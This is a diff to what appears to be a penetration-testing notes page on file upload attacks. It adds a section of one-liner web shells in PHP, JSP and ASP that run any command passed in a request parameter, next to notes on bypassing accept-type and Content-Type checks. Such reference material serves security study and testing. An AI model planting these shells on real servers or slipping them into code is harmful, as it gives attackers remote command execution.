@@ -17,6 +17,20 @@
 * Upload payload file&#x20;
 * No restriction specified in accept-type header - all types (_/_) allowed
 
+<details>
+
+<summary>One-Liner Web Shells</summary>
+
+{% code lineNumbers="true" %}
+```shellscript
+<?php system($_REQUEST["cmd"]); ?>
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %> //jsp
+<% eval request("cmd") %> //asp
+```
+{% endcode %}
+
+</details>
+
 ### Content-Type Restriction Bypass
 
 * Modify `Content-Type` header to allowed file types
